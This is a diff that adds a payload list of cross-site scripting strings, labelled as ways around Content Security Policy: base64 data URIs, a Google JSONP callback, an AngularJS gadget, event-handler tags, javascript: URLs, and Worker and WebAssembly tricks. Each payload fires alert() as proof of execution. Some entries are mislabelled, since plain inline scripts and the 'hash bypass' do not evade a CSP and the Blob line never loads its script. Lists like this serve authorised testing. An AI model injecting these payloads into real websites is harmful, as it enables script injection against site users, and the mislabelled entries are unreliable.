@@ -1,0 +1,83 @@
+# CSP Bypass Payloads for XSS
+# Basic CSP bypass payloads
+
+# Script-src bypass using base64
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+# JSONP bypass
+<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+# Script gadgets
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+
+# SVG bypass
+<svg onload=alert(1)>
+
+# Image bypass
+<img src=x onerror=alert(1)>
+
+# Object bypass
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
+
+# Iframe bypass
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+
+# Meta refresh bypass
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Link prefetch bypass
+<link rel="prefetch" href="javascript:alert(1)">
+
+# CSS expression (IE)
+<style>body{background:url("javascript:alert(1)")}</style>
+
+# Form bypass
+<form><button formaction="javascript:alert(1)">CLICK
+
+# Details bypass
+<details open ontoggle=alert(1)>
+
+# Marquee bypass
+<marquee onstart=alert(1)>
+
+# Audio bypass
+<audio src=x onerror=alert(1)>
+
+# Video bypass
+<video src=x onerror=alert(1)>
+
+# Embed bypass
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+
+# Script-src 'unsafe-inline' bypass
+<script>alert(1)</script>
+
+# Script-src 'unsafe-eval' bypass
+<script>eval('alert(1)')</script>
+
+# Nonce bypass (requires nonce extraction)
+<script nonce="NONCE_HERE">alert(1)</script>
+
+# Hash bypass
+<script>alert(1)</script>
+
+# Worker bypass
+<script>new Worker('data:application/javascript,alert(1)')</script>
+
+# WebAssembly bypass
+<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]),{}).then(r=>alert(1))</script>
+
+# DOM-based bypass
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+
+# Location hash bypass
+<script>location='javascript:alert(1)'</script>
+
+# Protocol bypass
+<a href="javascript:alert(1)">click</a>
+
+# Data URI bypass
+<script src="data:text/javascript,alert(1)"></script>
+
+# Blob bypass
+<script>URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'}))</script>
